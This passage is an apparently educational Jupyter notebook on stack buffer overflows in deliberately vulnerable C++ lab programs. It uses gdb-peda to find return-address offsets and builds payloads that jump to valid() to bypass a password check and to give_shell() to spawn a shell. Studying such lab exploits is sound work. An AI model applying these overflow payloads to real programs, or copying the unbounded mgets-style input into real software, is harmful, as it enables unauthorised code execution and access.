    "0016| 0xffffc320 (\"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0020| 0xffffc324 (\"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0024| 0xffffc328 (\"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0028| 0xffffc32c (\"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x413b4141 in ?? ()\n",
    "```\n",
    "\n",
    "- program crashed!\n",
    "- let's search the pattern for offset\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts  # pattern search\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 20\n",
    "EBP+0 found at offset: 24\n",
    "EIP+0 found at offset: 28 <--------- this is the offset!\n",
    "Registers point to pattern buffer:\n",
    "[EDX] --> offset 0 - size ~100\n",
    "[ESP] --> offset 32 - size ~68\n",
    "[ESI] --> offset 96 - size ~4\n",
    "Pattern buffer found at:\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc2f0 : offset    0 - size  100 ($sp + -0x20 [-8 dwords])\n",
    "0xffffc689 : offset    0 - size  100 ($sp + 0x379 [222 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7e62d2c : 0xffffc2f0 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffc2d0 : 0xffffc2f0 ($sp + -0x40 [-16 dwords])\n",
    "0xffffc2e0 : 0xffffc2f0 ($sp + -0x30 [-12 dwords])\n",
    "0xffffc3f8 : 0xffffc689 ($sp + 0xe8 [58 dwords])\n",
    "```\n",
    "\n",
    "- let's run the program in gdb with 28As+BBBB\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run $(python -c 'print(\"A\"*28+\"BBBB\")')\n",
    "Starting program: /home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe $(python -c 'print(\"A\"*28+\"BBBB\")')\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0 \n",
    "EBX: 0x41414141 ('AAAA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc340 ('A' <repeats 28 times>, \"BBBB\")\n",
    "ESI: 0xffffc3a0 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41414141 ('AAAA')\n",
    "ESP: 0xffffc360 --> 0xffffc600 --> 0x4 \n",
    "EIP: 0x42424242 ('BBBB')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x42424242\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc360 --> 0xffffc600 --> 0x4 \n",
    "0004| 0xffffc364 --> 0xffffffff \n",
    "0008| 0xffffc368 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0012| 0xffffc36c --> 0x80492e7 (<main(int, char**)+24>: add    ebx,0x2d19)\n",
    "0016| 0xffffc370 --> 0x2 \n",
    "0020| 0xffffc374 --> 0xffffc444 --> 0xffffc690 (\"/home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe\")\n",
    "0024| 0xffffc378 --> 0xffffc450 --> 0xffffc6ee (\"SHELL=/bin/bash\")\n",
    "0028| 0xffffc37c --> 0xffffc3a0 --> 0x2 \n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x42424242 in ?? () <-------- BBBB\n",
    "```\n",
    "- so we've determined that 2 bytes of junk will get us to the location where caller's return address is stored\n",
    "- now instead of overwriting the return address with BBBB, how about we find some interesting function's address!\n",
    "- use **nm** to find the addresses of all the symbols"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804c030 B __bss_start\r\n",
      "0804c030 b completed.0\r\n",
      "         U __cxa_atexit@@GLIBC_2.1.3\r\n",
      "0804c028 D __data_start\r\n",
      "0804c028 W data_start\r\n",
      "08049100 t deregister_tm_clones\r\n",
      "080490e0 T _dl_relocate_static_pie\r\n",
      "08049180 t __do_global_dtors_aux\r\n",
      "0804bf00 d __do_global_dtors_aux_fini_array_entry\r\n",
      "0804c02c D __dso_handle\r\n",
      "0804bf04 d _DYNAMIC\r\n",
      "0804c030 D _edata\r\n",
      "0804c034 B _end\r\n",
      "         U exit@@GLIBC_2.0\r\n",
      "08049468 T _fini\r\n",
      "0804a000 R _fp_hw\r\n",
      "080491b0 t frame_dummy\r\n",
      "0804bef8 d __frame_dummy_init_array_entry\r\n",
      "0804a304 r __FRAME_END__\r\n",
      "0804c000 d _GLOBAL_OFFSET_TABLE_\r\n",
      "080493ce t _GLOBAL__sub_I__Z5validv\r\n",
      "         w __gmon_start__\r\n",
      "0804a0a0 r __GNU_EH_FRAME_HDR\r\n",
      "08049000 T _init\r\n",
      "0804bf00 d __init_array_end\r\n",
      "0804bef8 d __init_array_start\r\n",
      "0804a004 R _IO_stdin_used\r\n",
      "08049460 T __libc_csu_fini\r\n",
      "08049400 T __libc_csu_init\r\n",
      "         U __libc_start_main@@GLIBC_2.0\r\n",
      "080492cf T main\r\n",
      "08049140 t register_tm_clones\r\n",
      "080490a0 T _start\r\n",
      "         U strcmp@@GLIBC_2.0\r\n",
      "         U strcpy@@GLIBC_2.0\r\n",
      "0804c030 D __TMC_END__\r\n",
      "080493f2 T __x86.get_pc_thunk.ax\r\n",
      "08049461 T __x86.get_pc_thunk.bp\r\n",
      "080490f0 T __x86.get_pc_thunk.bx\r\n",
      "0804925f T _Z20check_authenticationPc\r\n",
      "08049375 t _Z41__static_initialization_and_destruction_0ii\r\n",
      "080491b2 T _Z5validv\r\n",
      "08049215 T _Z7invalidv\r\n",
      "         U _ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4\r\n",
      "         U _ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4\r\n",
      "         U _ZSt4cout@@GLIBCXX_3.4\r\n",
      "0804a008 r _ZStL19piecewise_construct\r\n",
      "0804c031 b _ZStL8__ioinit\r\n",
      "         U _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4\r\n"
     ]
    }
   ],
   "source": [
    "! nm auth_overflow3.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# how about **valid** function?!\n",
    "# must use: sys.stdout.buffer.write to print memory addresses and binary data!\n",
    "! ./auth_overflow3.exe $(python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*28 + b\"\\xB2\\x91\\x04\\x08\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we forced the execution flow of the program to return to **valid()** and execute it instead of the **invalid()** for wrong password!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## One more example\n",
    "\n",
    "- let's look at the stack_overflow_stdio.cpp program that has a give_shell() function that's not called anywhere in the program\n",
    "- when bad function is done executing, the program should execute cout statement in **main()** printing 'Good bye!' on the console\n",
    "- since, **bad()** has overflow vulnerability, we can overflow **buffer** and overwrite the caller's return address with the address of **give_shell()**\n",
    "- let's try to exploit the program to execute **give_shell()**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/stack_overflow_stdio.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/types.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <iostream>\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void give_shell(){\r\n",
      "    // Set the gid to the effective gid\r\n",
      "    // this prevents /bin/sh from dropping the privileges\r\n",
      "    gid_t gid = getegid();\r\n",
      "    setresgid(gid, gid, gid);\r\n",
      "    system(\"/bin/sh -i\");\r\n",
      "}\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    char ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while (cin.get(ch) && ch == ' ' or ch == '\\t') \r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (ch = getchar()) {\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    } \r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    printf(\"Enter some data: \");\r\n",
      "    mgets(buffer); // similar to C's gets; depricated\r\n",
      "    //gets(buffer);\r\n",
      "    cout << \"buffer contains: \" << buffer << endl;\r\n",
      "    printf(\"size of buffer = %d and length is %d\\n\", sizeof(buffer), strlen(buffer));\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_stdio.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " - let's compile the program and execute it\n",
    " - recall that the buffer's address doesn't change as long as the program name length is not changed and no argument is passed to the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh stack_overflow_stdio.cpp stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2c0\r\n",
      "Enter some data: buffer contains: Hello World!\r\n",
      "size of buffer = 128 and length is 12\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"Hello World!\")' | ./stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### steps to exploit the stack_overflow_stdio.exe to give_shell\n",
    "\n",
    "1. find the offset of the return address with respective to the buffer\n",
    "2. find the address of give_shell symbol\n",
    "3. send junk of offset length and the address of give_shell() to return to it\n",
    "4. and voila!\n",
    "\n",
    "#### step1: find the offset\n",
    "- we'll use gdb-peda's cyclic pattern for this as shown below\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ gdb -q stack_overflow_stdio.exe\n",
    "Reading symbols from stack_overflow_stdio.exe...\n",
    "```\n",
    "- let's create a pattern of 200 bytes (long enough) to overwrite the caller's return address and store it to a file\n",
    "- since, the program gets the data interactively via std I/O, we'll pipe the data from the file when executing the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 200 pattern.txt\n",
    "Writing pattern of 200 chars to filename \"pattern.txt\"\n",
    "\n",
    "gdb-peda$ run < pattern.txt\n",
    "Starting program: /home/kali/projects/Hacking-CPP-Notebooks/stack_overflow_stdio.exe < pattern.txt\n",
    "buffer is at 0xffffc300\n",
    "Enter some data: buffer contains: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n",
    "size of buffer = 128 and length is 200\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x27 (\"'\")\n",
    "EBX: 0x6c414150 ('PAAl')\n",
    "ECX: 0x0 \n",
    "EDX: 0x1 \n",
    "ESI: 0xf7de6000 --> 0x1e4d6c \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffc390 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc390 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffc394 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0008| 0xffffc398 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffc39c (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffc3a0 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffc3a4 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffc3a8 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffc3ac (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "```\n",
    "- let's search for the offset using pattern search in registers\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 132\n",
    "EBP+0 found at offset: 136\n",
    "EIP+0 found at offset: 140  <-------- offset to the return address\n",
    "Registers point to pattern buffer:\n",
    "[ESP] --> offset 144 - size ~56\n",
    "Pattern buffer found at:\n",
    "0x08051bd7 : offset   22 - size  178 ([heap])\n",
    "0x08051fc0 : offset    0 - size  200 ([heap])\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc300 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7de6584 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6588 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de658c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6590 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6594 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6598 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de659c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7e62d1c : 0xffffc300 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffc2e0 : 0xffffc300 ($sp + -0xb0 [-44 dwords])\n",
    "\n",
    "```\n",
    "- so, the caller's return address is **140** bytes away from the buffer\n",
    "\n",
    "#### step 2: find the address of give_shell()\n",
    "- we'll use **nm** command to find the address of symbols"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804c048 B __bss_start\r\n",
      "0804c048 b completed.0\r\n",
      "         U __cxa_atexit@@GLIBC_2.1.3\r\n",
      "0804c040 D __data_start\r\n",
      "0804c040 W data_start\r\n",
      "08049160 t deregister_tm_clones\r\n",
      "08049140 T _dl_relocate_static_pie\r\n",
      "080491e0 t __do_global_dtors_aux\r\n",
      "0804bef8 d __do_global_dtors_aux_fini_array_entry\r\n",
      "0804c044 D __dso_handle\r\n",
      "0804befc d _DYNAMIC\r\n",
      "0804c048 D _edata\r\n",
      "0804c04c B _end\r\n",
      "08049528 T _fini\r\n",
      "0804a000 R _fp_hw\r\n",
      "08049210 t frame_dummy\r\n",
      "0804bef0 d __frame_dummy_init_array_entry\r\n",
      "0804a2dc r __FRAME_END__\r\n",
      "         U getchar@@GLIBC_2.0\r\n",
      "         U getegid@@GLIBC_2.0\r\n",
      "0804c000 d _GLOBAL_OFFSET_TABLE_\r\n",
      "0804948c t _GLOBAL__sub_I__Z10give_shellv\r\n",
      "         w __gmon_start__\r\n",
      "0804a080 r __GNU_EH_FRAME_HDR\r\n",
      "08049000 T _init\r\n",
      "0804bef8 d __init_array_end\r\n",
      "0804bef0 d __init_array_start\r\n",
      "0804a004 R _IO_stdin_used\r\n",
      "08049520 T __libc_csu_fini\r\n",
      "080494c0 T __libc_csu_init\r\n",
      "         U __libc_start_main@@GLIBC_2.0\r\n",
      "080493ec T main\r\n",
      "         U printf@@GLIBC_2.0\r\n",
      "080491a0 t register_tm_clones\r\n",
      "         U setresgid@@GLIBC_2.0\r\n",
      "08049100 T _start\r\n",
      "         U strlen@@GLIBC_2.0\r\n",
      "         U system@@GLIBC_2.0\r\n",
      "0804c048 D __TMC_END__\r\n",
      "080494b0 T __x86.get_pc_thunk.ax\r\n",
      "08049521 T __x86.get_pc_thunk.bp\r\n",
      "08049150 T __x86.get_pc_thunk.bx\r\n",
      "08049212 T _Z10give_shellv\r\n",
      "0804932b T _Z3badv\r\n",
      "08049433 t _Z41__static_initialization_and_destruction_0ii\r\n",
      "08049258 T _Z5mgetsPc\r\n",
      "         U _ZNKSt9basic_iosIcSt11char_traitsIcEEcvbEv@@GLIBCXX_3.4.21\r\n",
      "         U _ZNSi3getERc@@GLIBCXX_3.4\r\n",
      "         U _ZNSolsEPFRSoS_E@@GLIBCXX_3.4\r\n",
      "         U _ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4\r\n",
      "         U _ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4\r\n",
      "         U _ZSt3cin@@GLIBCXX_3.4\r\n",
      "         U _ZSt4cout@@GLIBCXX_3.4\r\n",
      "         U _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@@GLIBCXX_3.4\r\n",
      "0804a008 r _ZStL19piecewise_construct\r\n",
      "0804c049 b _ZStL8__ioinit\r\n",
      "         U _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4\r\n"
     ]
    }
   ],
   "source": [
    "! nm stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- look for a line that looks something like: 08049212 T _Z10give_shellv\n",
    "- the first column (08049212) is the address of the symbols when the program is loaded in memory for execution\n",
    "- now let's create the payload of 140 JUNK + [little endian address of give_shell] and send it to the program as shown below\n",
    "- caveat: since the program takes data from STD IO, we need to create and store the payload into a file\n",
    "- then pipe the contents of the payload, so we can get the interactive shell!\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ python -c 'import sys; sys.stdout.buffer.write(b\"A\"*140 + b\"\\x12\\x92\\x04\\x08\")' > payload.bin\n",
    "\n",
    "cat payload.bin - | ./stack_overflow_stdio.exe \n",
    "buffer is at 0xffffc350\n",
    "Enter some data: sdf\n",
    "buffer contains: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsdf\n",
    "size of buffer = 128 and length is 147\n",
    "$ \n",
    "\n",
    "```\n",
    "- Note the shell may not be stable; after executing a single command it may close out (not sure why!)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
